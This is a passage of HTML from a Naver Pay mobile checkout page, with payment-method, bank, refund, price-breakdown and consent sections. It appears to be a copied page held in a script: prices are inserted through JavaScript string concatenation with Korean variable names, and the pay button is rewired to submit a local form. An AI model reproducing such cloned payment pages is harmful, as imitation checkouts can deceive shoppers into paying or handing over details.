				<li class="radio_list_item"><input type="radio" id="payMobilePin" name="payMobileOn" class="hidden _click(checkout.mobile.order.order_sheet.changeMobilePayMethod(MOBILE)) _stopDefault" checked=""><label for="payMobileOn" class="sp_radio radio_left">일반결제</label></li>
			</ul>
		
		
			<ul class="inp_d _mobileTemplate _recentPaymentMethodFragment">
				<li>
					<div class="slt_bx">
						<select title="휴대폰 첫째자리 입력" name="mobileSettleInfo.cellPhoneNo___1" class="inpnum _mobileTelNo _group_tel_3_1">
								<option value="010">010</option> 
								<option value="011">011</option> 
								<option value="016">016</option> 
								<option value="017">017</option> 
								<option value="018">018</option> 
								<option value="019">019</option> 
						</select>
						<span class="ico"></span>
					</div>
				</li>
				<li>
					<input type="tel" title="휴대폰 둘째자리 입력" class="inptxt inpnum _onlyNumberTarget _mobileTelNo _group_tel_3_2" maxlength="4" name="mobileSettleInfo.cellPhoneNo___2" pattern="[0-9]*">
				</li>
				<li>
					<input type="tel" title="휴대폰 셋째자리 입력" class="inptxt inpnum _onlyNumberTarget _mobileTelNo _group_tel_3_3" maxlength="4" name="mobileSettleInfo.cellPhoneNo___3" pattern="[0-9]*">
				</li>
			</ul>
		
		
		
		
		</div>
		<div class="orderwish_area _payMethodForm _mobilepinTemplate" style="display:none;">
			<ul class="radio_list">
				<li class="radio_list_item"><input type="radio" id="payMobilePin" name="payMobilePin" class="hidden _click(checkout.mobile.order.order_sheet.changeMobilePayMethod(MOBILEPIN)) _stopDefault" checked=""><label for="payMobilePin" class="sp_radio radio_left">간편결제</label></li>
				<li class="radio_list_item"><input type="radio" id="payMobileOn" name="payMobilePin" class="hidden _click(checkout.mobile.order.order_sheet.changeMobilePayMethod(MOBILE)) _stopDefault"><label for="payMobileOn" class="sp_radio radio_left">일반결제</label></li>
			</ul>
			
			
			
			<ul class="inp_d _pinMobileUnregistered">
				<li>
					<div class="slt_bx">
						<select title="휴대폰 첫째자리 입력" name="mobileSettleInfo.cellPhoneNo___1" class="inpnum _mobileTelNo _group_tel_pin_3_1">
								<option value="010">010</option> 
								<option value="011">011</option> 
								<option value="016">016</option> 
								<option value="017">017</option> 
								<option value="018">018</option> 
								<option value="019">019</option> 
						</select>
						<span class="ico"></span>
					</div>
				</li>
				<li>
					<input type="tel" title="휴대폰 둘째자리 입력" class="inptxt inpnum _onlyNumberTarget _mobileTelNo _group_tel_pin_3_2" maxlength="4" name="mobileSettleInfo.cellPhoneNo___2" pattern="[0-9]*">
				</li>
				<li>
					<input type="tel" title="휴대폰 셋째자리 입력" class="inptxt inpnum _onlyNumberTarget _mobileTelNo _group_tel_pin_3_3" maxlength="4" name="mobileSettleInfo.cellPhoneNo___3" pattern="[0-9]*">
				</li>
			</ul>
			
			
			<!-- TODO : 위치이동 -->
		
		
		
		
		</div>
		<div class="orderwish_area _skipTemplate _payMethodForm" style="display:none;">
			<div class="value_select">
				<label for="general1" class="hidden">나중에 결제 방법 선택</label>
				<select class="N=a:ode.ploption sp_select_icon value2 _skipPaymentMethodSelectBox _change(checkout.mobile.order.order_sheet.changeSkipPaymentMethod()) _stopDefault" id="general1">
					<option value="BANK">            나중에 계좌 결제
		</option>
					<option value="CREDIT_CARD">            나중에 카드 결제
		</option>
					<option value="VIRTUAL_ACCOUNT">            나중에 무통장 입금
		</option>
				</select>
			</div>
			<div class="info_area _skipBankInfo _skipPayMethodInfo" style="display: none">
				<div>
				</div>
				<strong class="title">지금 즉시 결제하지 않아도 됩니다!</strong>
				<p class="desc">주문후 2영업일 이내에<br><a href="/o/home" target="_blank" class="N=a:ode.timeline point_green">결제 내역에서 결제</a>해주세요.<br>결제 완료 후 배송이 진행됩니다.</p>
					<div class="desc_register">
						<p>지금 계좌 등록하면<br>나중에 더 쉽고 빠르게 결제하실 수 있어요.</p>
						<a href="#" class="N=a:ode.adspaccount link _click(checkout.mobile.order.order_sheet.registerEasyBank()) _stopDefault">계좌 등록</a>
					</div>
			</div>
			<div class="info_area _skipCreditCardInfo _skipPayMethodInfo" style="display: none">
				<div>
				</div>
				<strong class="title">지금 즉시 결제하지 않아도 됩니다!</strong>
				<p class="desc">주문후 2영업일 이내에<br><a href="/o/home" target="_blank" class="N=a:ode.timeline point_green">결제 내역에서 결제</a>해주세요.<br>결제 완료 후 배송이 진행됩니다.</p>
					<div class="desc_register">
						<p>지금 카드 등록하면<br>나중에 더 쉽고 빠르게 결제하실 수 있어요.</p>
						<a href="#" class="N=a:ode.adspcard link _click(checkout.mobile.order.order_sheet.registerEasyCard()) _stopDefault">카드 등록</a>
					</div>
			</div>
			<div class="info_area type_bank _skipVirtualAccountInfo _skipPayMethodInfo _payMethod _VIRTUAL_ACCOUNT" style="display: none">
		<div class="value_select" style="margin-top:5px;">
			<label for="bankname" class="hidden">은행 선택</label>
			<select title="무통장 결제은행 선택" name="nonBankBookSettleInfo.nonBankBookPayBankCode" id="bankname" class="sp_select_icon value2 _nonBankBookPayBankCode _payForm">
				<option value="">은행선택</option>
				<option value="011">농협</option>
				<option value="004">국민은행</option>
				<option value="088">신한은행</option>
				<option value="020">우리은행</option>
				<option value="003">기업은행</option>
				<option value="081">하나은행</option>
				<option value="031">대구은행</option>
				<option value="032">부산은행</option>
				<option value="071">우체국</option>
				<option value="023">SC제일은행</option>
				<option value="034">광주은행</option>
				<option value="039">경남은행</option>
				<option value="007">수협</option>
				<option value="089">케이뱅크</option>
			</select>
		</div>
		<p class="info_txt sp_ordersheet_icon icon_info"><span>농협, 국민, 부산, SC, 우체국은 ATM 현금 입금 불가</span><br>(은행 창구, 인터넷 뱅킹 이용 가능)</p>
		<div class="refund_select">
			<h3 class="h3">환불방법</h3>
			<ul class="radio_list vertical_list">
				<li class="radio_list_item _refundInfo">
					<div class="area_refund_account has_button">
						<input id="refund1" name="refundAccountInfo.refundMethodType" type="radio" class="refund_account_radio hidden _refundMethod _payForm" value="BANK_ACCOUNT" checked="">
						<label for="refund1" class="refund_account_label _click(checkout.mobile.order.order_sheet.changeRefundMethodType(BANK_ACCOUNT))">본인계좌환불</label>
							<p class="refund_account_detail _refundAccountArea _refundAccountInfoNoExists">
									<a href="#" class="enhanced _click(checkout.mobile.order.order_sheet.registerEasyBank()) _stopDefault">계좌를 추가해주세요.</a>
		
								<button type="button" class="button_refund_tooltip _click(checkout.mobile.order.order_sheet.showLayer(layer_refund_account_desc)) _stopDefault"><span class="blind">도움말</span></button>
								<span class="refund_account_tooltip _layer_refund_account_desc" style="bottom:-62px;left:9px; display: none">환불계좌 출금 정책 변경으로 인해<br><span class="point_color">신규 환불계좌 선택이 필요합니다.</span>
									<button type="button" class="refund_tooltip_close _click(checkout.mobile.order.order_sheet.hideLayer(layer_refund_account_desc)) _stopDefault"><span class="blind">닫기</span></button>
								</span>
							</p>
						<p class="refund_account_detail _refundAccountArea _refundAccountInfoExist" style="display:none"> </p>
							<a href="#" class="refund_account_link _refundAccountArea _refundAccountButton _click(checkout.mobile.order.order_sheet.registerEasyBank()) _stopDefault">추가</a>
					</div>
				</li>
		
				<li class="radio_list_item">
					<div class="area_refund_account">
						<input id="refund2" name="refundAccountInfo.refundMethodType" type="radio" class="refund_account_radio hidden _refundMethod _payForm" value="CHARGE_AMOUNT">
						<label for="refund2" class="refund_account_label _click(checkout.mobile.order.order_sheet.changeRefundMethodType(CHARGE_AMOUNT))">환불정산액 적립</label>
					</div>
				</li>
			</ul>
		</div>
		
		<input type="hidden" class="_refundAccountKey _payForm" name="refundAccountInfo.refundAccountKey" value="">
		
		<div class="dimlayer _refundAccountListLayer" style="display:none;">
			<div class="dimbg"></div>
			<div class="bottom_floating pointcharge_layer">
				<strong class="popup_title">계좌 목록</strong>
				<ul class="account_list">
						<li class="account none">
							등록된 계좌가 없습니다.<br>계좌를 추가해 주세요.
						</li>
				</ul>
				<button type="button" class="N=a:ode.chargepointaccountadd button_add _click(checkout.mobile.order.order_sheet.registerEasyBank()) _stopDefault">계좌 추가</button>
				<button type="button" class="button_close openbanking_img _click(checkout.mobile.order.order_sheet.hideModalLayer(refundAccountListLayer)) _stopDefault"><span class="blind">레이어닫기</span></button>
			</div>
		</div>    </div>
		
				<div class="info_area _skipLayer _skipVirtualAccountLayer" style="display: none">
					<div class="orderwish_layer">
						<strong class="title">잠깐! 매번 이체하기<br>번거로우시죠? 계좌로 결제하시면,</strong>
						<ul class="benefit">
							<li>현금영수증 자동 발급</li>
							<li>송금 실수 걱정없이 안전하게</li>
							<li>주문후 2영업일 이내 결제</li>
						</ul>
						<div class="btn_area">
							<a href="#" class="N=a:ode.placcount bt_com type_green _click(checkout.mobile.order.order_sheet.changeSkipBank()) _stopDefault">나중에 계좌 결제</a>
						</div>
						<div class="chk_txt">
							<input type="checkbox" id="chk2" class="N=a:ode.nolayer hidden _click(checkout.mobile.order.order_sheet.closeBtnOfSkipLayerDuringFewDate(VirtualAccount)) _stopDefault">
							<label for="chk2">7일간 다시 보지 않기</label>
						</div>
						<button type="button" class="N=a:ode.closelayer btn_close _click(checkout.mobile.order.order_sheet.closeBtnOfSkipLayer(VirtualAccount)) _stopDefault"><span class="blind">닫기</span></button>
					</div>
				</div>
		
			<div class="button_wrap">
				<button type="button" class="N=a:ode.plmean _click(checkout.mobile.order.order_sheet.showSkipTooltip()) _stopDefault"><span class="sp_ordersheet_icon icon_help2 "></span> 나중에 결제란?</button>
				<div class="tooltip_box _skipTooltip" style="display:none;bottom: 20px">
					<dl class="lay_content">
						<dt>나중에 결제란?</dt>
						<dd>무통장입금과 같이 지금 결제하지 않고 주문 완료 후 2영업일 내에 결제할 수 있는 결제 수단입니다.
							<ul class="bullet">
								<li>결제수단 : 계좌 간편결제, 카드 간편결제</li>
							</ul>
							(상품에 따라 이용 가능한 결제 수단이 다를 수 있으니 주문 시 확인해주세요)
						</dd>
						<dd>
							<ul class="bullet">
									<li>결제가 완료되어야 배송이 진행되며 2영업일 내 결제되지 않으면 주문이 취소됩니다.</li>
								<li>‘나중에 결제’ 수단을 선택하실 경우 주문후 2영업일 이내에 <a href="/o/home" class="N=a:ode.timeline point_green point_underline" target="_blank">결제 내역에서 결제</a>해주세요.</li>
							</ul>
						</dd>
						<dd>무통장입금을 원하시는 경우 ‘나중에 무통장 입금’ 결제 수단으로 주문해주세요.</dd>
					</dl>
					<a href="#" class="btn_close_layer _click(checkout.mobile.order.order_sheet.hideSkipTooltip()) _stopDefault"><span class="blind">도움창 닫기</span></a>
				</div>
			</div>
		
			<!-- 일반결제 - 충전결제 유도 배너 -->
			<div class="card_banner_area _chargePointUseGeneralPaymentBanner" style="display: block;">
				<a href="#chargePointScrollArea" class="N=a:ode.general_chargepoint_later charge_banner _click(checkout.mobile.order.order_sheet.activateChargePoint())">
					<p class="banner_text">
						지금 결제수단 변경하면
						<span class="line">
							<strong class="point _chargePointBenefitAmount">최대 311원</strong><span class="sub_text _chargePointBenefitPercent"><span class="bracket">(</span>3%<span class="bracket">)</span></span> 받기 가능!
						</span>
					</p>
					<div class="banner_link">충전결제하기</div>
				</a>
			</div>
		
				<div class="banner_point" id="div-6"></div>
		</div>                </div>
					</li>
				</ul>
				<ul class="payment_list _paymentBenefitInfoArea">
					<li class="payment_item on">
						<input type="checkbox" id="info2" class="hidden" checked="">
						<label for="info2" class="payment_info _paymentBenefitInfoLabel type_notext">
							<span class="ico_caution">결제/할인혜택 안내</span>
							<div class="fold_info">
								<ul class="sub_list _paymentBenefitInfoList">
									<li class="benefit_info _bccard_notice" style="display: none">카드에 BC 마크가 없는 경우 무이자 할부 적용 불가</li>
									<li class="benefit_info _noInstallmentMonthStr" style="display: none">부분 무이자 할부 적용(1,2,3회차 수수료 고객 부담)</li>
									<li class="benefit_info _eventInfoStr" style="display: none"><span class="">삼성카드 5% 청구할인</span> 최대 5,000원</li>
									<li class="benefit_info _companycard_notice" style="display: none">법인(개인사업자 법인 포함)카드는 할부/무이자혜택 적용 불가</li>
									<li class="benefit_info _registerCardChangeLink" style="display: none;">등록 카드는 <a href="https://m.pay.naver.com/mobile/setting/card/info" target="_blank" class="link">설정&gt;카드정보</a>에서 변경 가능합니다.</li>
									<li class="benefit_info _registerBankChangeLink" style="display: none">등록 계좌는 <a href="https://m.pay.naver.com/mobile/setting/bank/info" target="_blank" class="link">설정&gt;계좌정보</a>에서 변경 가능합니다.</li>
									<li class="benefit_info _unionpay_notice_kr" style="display: none">국내(한국) 발급 카드는 결제 불가능합니다. 해당 카드사 선택하여 진행 부탁드립니다.</li>
									<li class="benefit_info _unionpay_notice_cn" style="display: none">本交易不支持银联在线支付，请选择韩国发卡行提供的线上支付工具。</li>
								</ul>
								<a href="#" class="shortcut_link _click(checkout.mobile.order.order_sheet.openPayAndBenefitInfo()) _stopDefault">전체보기</a>
							</div>
						</label>
					</li>
				</ul>
				<input type="hidden" name="totalReviewMileage" value="0">
			</div>
		
			<input type="hidden" name="firstSelectPayMethod" class="_firstPayMethod" value="NC">
			<input type="hidden" name="firstSelectSubPayMethod" class="_firstSubPayMethod" value="CHARGED_POINT">
			<input type="hidden" name="billingPgId" class="_pgId _payForm">
			<input type="hidden" name="reserveSeq" value="6262803928" class="_payForm">
			<input type="hidden" name="mobileSettleInfo.isPinPay" class="_isPinPay _payForm">
		</div>		</div>
			</span>
		</div>
		<div class="order_box receipt_sc _cashReceiptTemplate" style="display: none;">
			<input type="hidden" id="receiptServiceType" name="receiptInfo.serviceType" value="" disabled="">
			<div class="ord_tit_v2 receipt _cashreceipt">
				<table cellpadding="0" cellspacing="0" border="0" class="tbl_ord">
				<colgroup><col width="100"><col>
				</colgroup><tbody><tr>
				<th scope="row">
					<div class="tlb_tit ic_terms5">
						<strong>현금영수증</strong><a href="#" class="ico_q _click(checkout.mobile.order.order_sheet.showCashReceiptInfoLayer()) _stopDefault">현금영수증 발급안내 도움말</a>
						<span>필수입력</span>
					</div>
				</th>
				<td>
					<ul class="rh_lst">
					<li class="on">
						<input type="radio" name="receiptInfo.receiptApplyed" value="true" id="rdo3_r1" class="N=a:ode.rece chk_rd _click(checkout.mobile.order.order_sheet.isCashReceipt()) _payForm" checked="checked" disabled="">
						<label for="rdo3_r1">신청</label>
					</li>
					<li class="">
						<input type="radio" name="receiptInfo.receiptApplyed" value="false" id="rdo3_r2" class="N=a:ode.norec chk_rd _click(checkout.mobile.order.order_sheet.isCashReceipt()) _payForm" disabled="">
						<label for="rdo3_r2">미신청</label>
					</li></ul>
				</td>
				</tr>
				</tbody></table>
			</div>
			<span class="_cashReceiptInfo" style="display: inline;">
				<div class="ord_inr receipt _cashReceiptInfoInput">
					
				</div>
			</span>
		</div>
		
		<div>
		<input type="checkbox" id="payment_detail" class="N=a:ode.sum hidden" checked="">
		<div class="benefit_point price_detail _paymentAmountInfoArea">
			<label for="payment_detail" class="fold_h h_arrow">
				<h4 class="point_h">결제상세
					<span class="point"><span class="_totalPaymentAmount">`+String(가격1 + 2500)+`</span>원</span>
				</h4>
			</label>
			<div class="point_content">
				<ul class="s_benefit_list">
					<li class="s_benefit_item">
						<div class="benefit_summary">
							<strong>주문금액</strong>
							<span class="summary_num"><em class="_totalPaymentAmount">`+String(가격1 + 2500)+`</em>원</span>
						</div>
						<ul class="inner_list">
							<li>
								<div class="benefit_case">상품금액</div>
								<span class="benefit_sum"><em>`+String(기존가격1)+`</em>원</span>
							</li>
								<li>
									<div class="benefit_case">배송비</div>
									<span class="benefit_sum"><dummy class="_totalDeliveryFeeSign">+</dummy><em class="_totalDeliveryFee">2500</em>원</span>
								</li>
								<li>
									<div class="benefit_case">쿠폰할인</div>
									<span class="benefit_sum"><dummy class="_totalDiscountPriceSign">-</dummy><em class="_totalDiscountPrice">`+String(기존가격1-가격1)+`</em>원</span>
								</li>
						</ul>
					</li>
				</ul>
				<ul class="payment_detail_list">
						<li class="_mileageUsedPaymentAmountArea" style="display: none;">
							<div class="benefit_summary">
								<strong>포인트 사용</strong>
								<span class="summary_num"><em class="_mileageUsedAmount">0</em>원</span>
							</div>
						</li>
					<li class="_payLaterAmountArea" style="display: none">
						<div class="benefit_summary">
							<strong>후불결제</strong>
							<span class="summary_num"><em class="_payLaterAmount">0</em>원</span>
						</div>
					</li>
					<li class="_generalPaymentAmountArea payment_item" style="display: list-item;">
						<div class="benefit_summary">
							<strong class="_generalPaymentClass">카드 간편결제</strong>
							<span class="summary_num"><em class="_generalPaymentAmount">`+String(가격1 + 2500)+`</em>원</span>
						</div>
					</li>
					<input type="hidden" class="_lastTotalPaymentPrice" name="order.payments[0].generalPayAmt" value="11200">
				</ul>
			</div>
		</div>
		</div> 
		
		<div class="_benefitAreaDisplayStatus on" style="display: block;">
			<input type="checkbox" id="benefit1_1" class="hidden" checked="">
			<div class="benefit_point">
				<label for="benefit1_1" class="N=a:ode.benefit fold_h sp_h h_point h_arrow">
					<h4 class="point_h">포인트 혜택<span class="point">최대 <em class="_totalBenefitMileageWithPayEvent">405</em>원</span></h4>
				</label>
				<div class="point_content">
					<ul class="s_benefit_list _totalAccumulateMileageArea" style="display: block;">
						<li class="s_benefit_item _purchaseBenefit" style="display: list-item;">
			
		
			<div class="benefit_summary">
				<strong>구매적립<button type="button" class="N=a:ode.beneinfo sp_ordersheet_icon icon_help2 _click(checkout.mobile.order.order_sheet.showLayerPayMileage()) _stopDefault"><span class="blind">도움말</span></button></strong>
				<em class="summary_num">총 255원</em>
			</div>
		
			<ul class="inner_list">
				
				
				
				
				
				
				
		
				
				<li>
					<span class="benefit_name">기본적립</span>
					<span class="benefit_sum"><em>87</em>원</span>
				</li>
				
				
				
				
				
				
				
				
				<li>
					<span class="benefit_case">충전포인트 결제적립</span>
					<span class="benefit_sum"><em>168</em>원</span>
				</li>
				
				
				
			</ul>
		</li>
						<li class="s_benefit_item _cardBenefitItem" style="display: none;">
							<div class="saving_inner _cardBenefit"></div>
						</li>
						<li class="s_benefit_item _reviewBenefit" style="display: list-item;">
			
				
				<div class="benefit_summary">
					<strong>리뷰적립<button type="button" class="N=a:ode.revinfo sp_ordersheet_icon icon_help2 _click(checkout.mobile.order.order_sheet.showLayerReviewMileage()) _stopDefault"><span class="blind">도움말</span></button></strong>
					<em class="summary_num">최대 150원</em>
				</div>
			
		
			<div class="desc_text">
				<p>동일 상품의 상품리뷰/한달사용리뷰 적립은 각각 1회로 제한됩니다.</p>
			</div>
		</li>
					</ul>
							<a href="#" class="banner_pointplus _stopDefault" style="cursor:default">
								<span class="banner_name">
									결제 후 오늘 <span class="ico_npmember type_np"><span class="blind">네이버페이 플러스</span></span>가입하면 다 챙겨드려요!
								</span>
								<span class="point_price">+348원</span>
							</a>
		
				</div>
			</div>
		</div>
		
		<div class="ord_sc terms_sc">
			<div class="terms_inr _allAgreementsArea">
		
				<li class="_agreeBox _payAgreement" style="display: none"><span><input type="checkbox" id="agree5" class="check_circle _certificationForm" name="payAgreement" checked=""><label for="agree5">위 구매조건 확인 및 결제진행 동의</label></span></li>
					<h3 class="term_name" style="display: none"><span class="term_text on"><input type="checkbox" id="all_agree_btn" class="check_circle _allAgreeBtn" name="allAgree"><label for="all_agree_btn">전체 동의하기</label></span></h3>
					<div class="chk_area tit_area">
					</div>
		
				<div class="area_info">
						<p class="comment">
								<span class="tit">개인정보 제공 동의 : </span>
								위드잇
		
							  
									<button type="button" class="button_detail _click(checkout.mobile.order.order_sheet.showAgreeDetailLayer(C2AgreementDetail))">상세보기</button>
						</p>
		
					<div class="purchase_safely">
						<p>구매안전 서비스 안내<button type="button" class="sp_ordersheet_icon icon_help_14 _click(checkout.mobile.order.order_sheet.showSafePurchaseHelp()) _stopDefault"><span class="blind">도움말</span></button></p>
						<div class="tooltip_box _safePurchaseHelp">
							<dl class="lay_content">
								<dt>구매안전 서비스 안내</dt>
								<dd>
									<ul class="list_info">
										<li>네이버파이낸셜(주)의 네이버페이 주문서를 통해 거래하는 모든 판매자는 안전거래를 위해 현금성 결제수단(계좌간편결제, 네이버페이 포인트 등)으로 결제한 거래에 대하여 자동적으로 네이버파이낸셜(주)이 제공하는 구매안전서비스(결제대금예치)를 적용하고 있습니다.</li>
										<li>네이버파이낸셜(주)의 전자금융거래법에 따라 금융위원회에 전자금융업자로 등록하였으며 결제대금예치업 등록번호는 02-006-00056 입니다.</li>
										<li>등록여부는 금융감독원 홈페이지(www.fss.or.kr)의 인허가업무안내 &gt; 등록신고 &gt; 전자금융업등록현황에서 확인하실 수 있습니다.</li>
									</ul>
								</dd>
							</dl>
							<a href="#" class="btn_close_layer _click(checkout.mobile.order.order_sheet.closeSafePurchaseHelp()) _stopDefault" role="button"><span class="blind">도움창 닫기</span></a>
						</div>
					</div>
				</div>
			</div>
			<div class="chk_area tit_area _pinPayAgree on" style="display:none;">
				<span class="label_link">
					<input type="checkbox" id="simple_hp" name="isPinPayAgree" class="check_circle">
					<label for="simple_hp" class="required"><a href="#" class="label_link _click(checkout.mobile.order.order_sheet.openPinPaymentProvideInfo()) _stopDefault">휴대폰 간편결제 등록정보 수집 및 동의하기</a></label>
				</span>
			</div>
		</div>
		<div class="area_notice">
			<p class="notice">주문 내용을 확인하였으며, 정보 제공 등에 동의합니다.</p>
		</div>
		
		
		<div class="button_section _payBtnDiv">
			<div class="button_area">
				<a href="javascript:document.getElementById('orderForm').submit();" class="N=a:ode.pay btm_button _click(checkout.mobile.order.order_sheet.create()) _stopDefault _doPayButton"><span class="_doPayText">결제하기</span></a>
			</div>
		</div>
		
		<div class="button_section _confirmBtnDiv" style="display:none;">
			<div class="button_area">
				<a href="#" class="btm_button _click(checkout.mobile.order.order_sheet.pinManage.agreePinPay()) _stopDefault">확인</a>
				<a href="#" class="btm_button _click(checkout.mobile.order.order_sheet.showFirstPayMethod()) _stopDefault">취소</a>
			</div>
		</div>
		
		<!-- //배너영역 -->
			<div class="ad_h72_type" id="div-1"></div>
		
		<div class="dimlayer _chargePointInputLayer" style="display:none;">
			<div class="dimbg"></div>
			<div class="top_floating pointcharge_layer">
				<strong class="popup_title">충전</strong>
				<div class="box_input_pointcharge_layer">
					<div class="area_input_pointcharge_layer">
						<input type="tel" name="chargePointInput" placeholder="금액을 입력해주세요." class="input_pointcharge_layer _chargePointInput _onlyPriceTarget _blur(checkout.mobile.order.order_sheet.focusOutChargePointInputPrice()) _focus(checkout.mobile.order.order_sheet.beforeChargePointInputPrice()) _stopDefault">
						<button type="button" class="input_value_clear _clearChargePointInput _click(checkout.mobile.order.order_sheet.clearChargePointInput()) _stopDefault"><span class="blind">초기화</span></button>
					</div>
					<span class="charge_input_unit">원</span>
				</div>
				<ul class="amount_list">
					<li class="amount">
						<button type="button" class="option _click(checkout.mobile.order.order_sheet.addChargePoint(10000)) _stopDefault">+1만</button>
					</li>
					<li class="amount">
						<button type="button" class="option _click(checkout.mobile.order.order_sheet.addChargePoint(100000)) _stopDefault">+10만</button>
					</li>
					<li class="amount">
						<button type="button" class="option _click(checkout.mobile.order.order_sheet.addChargePoint(500000)) _stopDefault">+50만</button>
					</li>
					<li class="amount">
						<button type="button" class="option _click(checkout.mobile.order.order_sheet.addChargePoint()) _stopDefault">+최대</button>
					</li>
				</ul>
		
				<p class="pointcharge_layer_desc _pointcharge_layer_desc">1만원 단위 / <strong class="emph">내 충전한도 450,000원</strong></p>
				<button type="button" class="button_complete _chargePointInputConfirm _click(checkout.mobile.order.order_sheet.confirmChargePointInputPrice()) _stopDefault">확인</button>
				<button type="button" class="button_close openbanking_img _click(checkout.mobile.order.order_sheet.hideModalLayer(chargePointInputLayer)) _stopDefault"><span class="blind">레이어닫기</span></button>
			</div>
		</div>    </div>
		
		
		<div class="_layer_common ly_type2" style="display:none;z-index: 100">
			<div class="lay_content _content">
			</div>
			<a href="#" class="clse _click(nmp.layer.hide()) _stopDefault clse _clse_tab"><span class="blind">닫기</span></a>
		</div>
		
		<div class="_layer_common_edged ly_type" style="display:none;z-index: 100">
			<div class="lay_content _content">
			</div>
			<a href="#" class="clse _click(nmp.layer.hide()) _stopDefault clse _clse_tab"><span class="blind">닫기</span></a>
			<div class="edge_cen"></div>
		</div>
		
		<div class="_layer_common_edged_line ly_type" style="display:none;z-index: 100">
			<div class="lay_content _content">
			</div>
			<a href="#" class="clse _click(nmp.layer.hide()) _stopDefault clse _clse_tab"><span class="blind">닫기</span></a>
			<div class="edge_cen"></div>
			<div class="line"></div>
		</div>
		
		<div class="_layer_common_line ly_type" style="display:none;z-index: 100">
			<div class="lay_content _content">
			</div>
			<a href="#" class="clse _click(nmp.layer.hide()) _stopDefault clse _clse_tab"><span class="blind">닫기</span></a>
			<div class="line"></div>
		</div>
		
		
		
		
		<div class="dimmed _layer_dimmed" style="display:none;"></div>
		
		<div class="ly_bx _layer_easypay_mileage" style="top:20px;display:none;">
			<dl class="benefit_wrap">
				<dt>구매 적립 혜택</dt>
				<dd>
					<ul class="txt layer_benefit_list">
						<li class="layer_benefit_item">상품별 주문금액기준 구매확정 시 즉시 적립됩니다.</li>
						<li class="layer_benefit_item">쿠폰할인금액/배송비/추가구성상품가격/SSG새벽배송 알비백 보증금은 제외되며 1회 주문 기준 최대 10만원까지만 적립됩니다. (단, 무통장입금은 최대 2만원까지 적립)</li>
						<li class="layer_benefit_item">충전포인트/네이버통장 결제적립은 충전포인트 사용금액에서 SSG새벽배송 알비백 보증금을 차감한 금액 기준으로 적립됩니다. (복합결제 시, 간편/일반결제&gt;후불결제&gt;충전포인트 순서로 보증금 금액 차감하여 계산)</li>
						<li class="layer_benefit_item">간편결제/일반결제에 따라 지급되는 적립혜택이 상이할 수 있습니다.</li>
						<li class="layer_benefit_item">상품주문결제 금액에서 구매 적립과 리뷰 적립 포인트를 차감한 금액이 0원 미만 (마이너스 금액)일 경우 구매 적립과 리뷰 작성에 대한 포인트 적립이 제외됩니다.</li>
						<li class="layer_benefit_item">예약/주문 시 노출되는 적립 금액은 적립 예상 금액으로 프로모션 내용에 따라 실제 적립되는 금액과 차이가 있을 수 있습니다.<br>(프로모션 상세 조건에 따라 적립)</li>
						<li class="layer_benefit_item">예약은 이용완료 후 적립됩니다.</li>
						<li class="layer_benefit_item">네이버주문은 음식 서빙 및 픽업이 완료된 이후 적립됩니다.</li>
						<li class="layer_benefit_item"><b>원쁠딜 공유 추가적립은 동일 상품에 대해 1회로 제한됩니다.</b></li>
						<li><a href="https://m.help.naver.com/support/contents/contentsView.help?contentsNo=7175" class="btn_txt">적립정책 자세히보기</a></li>
					</ul>
					<ul class="benefit_lst benefit_lst_v2 _content">
					</ul>
				</dd>
			</dl>
			<div class="cls_btn cls_btn_v2">
				<a href="#" class="N=a:ode.closeto _click(checkout.mobile.order.order_sheet.hideLayerEasyPayMileage()) _stopDefault">닫기</a>
			</div>
		</div>
		
		<script type="text/template" class="_tpl_layer_easypay_mileage">
			{for index:item in items}
			<li class="benefit_item">
				<div class="tmb">
					<img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH+A1BTQQAsAAAAAAEAAQAAAgJEAQA7" alt="{=item.productName}" data-src="https://m.pay.naver.com{=item.imageUrl}?type=m120" data-error-src="https://img-shop.pstatic.net/front/common/noimg/no_img_120x120.jpg" width="50" height="50"/>
				</div>
				<div class="inr">
					<strong class="tit">{=item.productName}</strong>
					{set commaMileage=pug.utility.convertNumberFormat(=item.mileage)}
					<span class="detail"><strong>{=commaMileage}</strong>원</span>
				</div>
			</li>
			{/for}
		</script>
		
		<div class="ly_bx _layer_card_benefit" style="display:none;">
			<div class="_content ly_cont no_payment _cardBenefitContents">
			</div>
		</div>
		
		<script type="text/template" class="_tpl_layer_card_mileage">
			<strong class="no_payment_title">혜택카드 적립</strong>
			<ul class="list_dot">
				<li class="item_dot">· 동일주문 내 모든 상품의 상태가 종료되면 구매확정 상품에 한해, 혜택카드 결제금액에 대한 혜택이 잔여한도 내에서 적립됩니다.</li>
				<li class="item_dot">· 혜택카드 잔여한도는 전체한도에서 확정 및 예정 혜택을 제외한 금액입니다.</li>
				<li class="item_dot">· 혜택 한도 소진 후 기존 주문에 대한 취소/환불 등의 사유로 한도 복구가 되더라도, 한도 소진 상태에서의 주문들에 대해서는 혜택이 소급적용 되지 않습니다.</li>
			</ul>
			<div class="area_reward">
				<div class="image">
					<img src={=cardImageUrl} width="40" height="26" alt={=cardName}>
				</div>
				<strong class="target">{=cardName}</strong>
				<span class="reward">
						<span class="cell">
							<span class="area_ellipsis">
								<span class="ellipsis">이벤트기간 내 잔여한도</span>
							</span>
						</span>
						<span class="cell">
							{set remainedCardBenefit=pug.utility.convertNumberFormat(=remainedCardBenefitAmount)}
							<em class="point">{=remainedCardBenefit}<span class="text">원</span></em>
						</span>
					</span>
			</div>
			<div class="pop_btnarea">
				<button type="button" class="npay_common_button _click(checkout.mobile.order.order_sheet.hideLayerCardBenefit())">확인</button>
			</div>
		</script>
		
		<div class="ly_bx _layer_review_mileage" style="top:20px;display:none;">
			<dl class="benefit_wrap benefit">
				<dt>리뷰 적립 혜택</dt>
				<dd class="_content"></dd>
			</dl>
			<div class="close_btn">
				<button type="button" class="N=a:ode.closerev npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideLayerReviewMileage()) _stopDefault"><span>닫기</span></button>
			</div>
		</div>
		<script type="text/template" class="_tpl_layer_review_mileage">
			<p class="txt">
				∙ 텍스트 리뷰와 포토/동영상 리뷰 적립 혜택은 중복으로 지급되지 않으며, 포토/동영상 리뷰 작성 포인트는 최초 작성 시 포토/동영상을 첨부할 경우에만 적립됩니다.
			</p>
			{set afterUseReviewExists = "N"}
			{for index:item in items}
				{if (item.textReviewMileage.AFTER_USE > 0) || (item.photoVideoReviewMileage.AFTER_USE > 0)}
					{set afterUseReviewExists = "Y"}
				{/if}
			{/for}
			{if afterUseReviewExists == "Y"}
				<p class="txt">
